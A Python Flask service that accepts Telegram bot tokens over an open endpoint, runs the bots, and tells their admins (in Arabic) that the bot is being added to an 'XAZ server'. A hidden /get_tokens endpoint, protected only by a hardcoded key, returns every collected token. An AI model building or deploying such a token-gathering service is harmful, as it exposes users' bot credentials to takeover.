from flask import Flask, request, jsonify
import telebot
import threading

app = Flask(__name__)

# تخزين التوكنات والإداريين في الذاكرة
bots = {}

# المفتاح السري لاسترجاع البيانات
SECRET_KEY = "923yp3iepeheo38293u38"

# دالة لبدء تشغيل البوت وإرسال رسالة للإداريين
def start_bot(token, admin_ids):
    try:
        bot_instance = telebot.TeleBot(token)

        # إرسال رسالة لكل إداري عند بدء تشغيل البوت
        for admin_id in admin_ids:
            try:
                bot_instance.send_message(
                    admin_id,
                    "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"❌ فشل إرسال رسالة إلى {admin_id}: {e}")

        # تشغيل البوت
        bot_instance.polling(none_stop=True, skip_pending=True)
    
    except Exception as e:
        print(f"❌ فشل تشغيل البوت ({token}): {e}")

# API لإضافة بوت جديد وتشغيله
@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.json
    token = data.get('token')
    admin_id = data.get('admin_id')

    if not token or not admin_id:
        return jsonify({'error': 'Token and Admin ID are required'}), 400

    # حفظ التوكن إذا لم يكن مسجلاً مسبقًا
    if token not in bots:
        bots[token] = {'admins': []}
    
    # إضافة الإداري إذا لم يكن موجودًا
    if admin_id not in bots[token]['admins']:
        bots[token]['admins'].append(admin_id)

    # تشغيل البوت فور إضافته
    threading.Thread(target=start_bot, args=(token, bots[token]['admins'])).start()

    return jsonify({'message': 'Bot added successfully', 'token': token, 'admin_id': admin_id})

# API لاسترجاع جميع التوكنات باستخدام مفتاح سري
@app.route('/get_tokens', methods=['POST'])
def get_tokens():
    data = request.json
    key = data.get('key')

    if key != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 403

    return jsonify({'tokens': bots})

# تشغيل جميع البوتات المخزنة عند بدء السيرفر
def run_all_bots():
    for token, data in bots.items():
        threading.Thread(target=start_bot, args=(token, data['admins'])).start()

# تشغيل السيرفر
if __name__ == '__main__':
    threading.Thread(target=run_all_bots).start()
    app.run(host='0.0.0.0', port=5000)
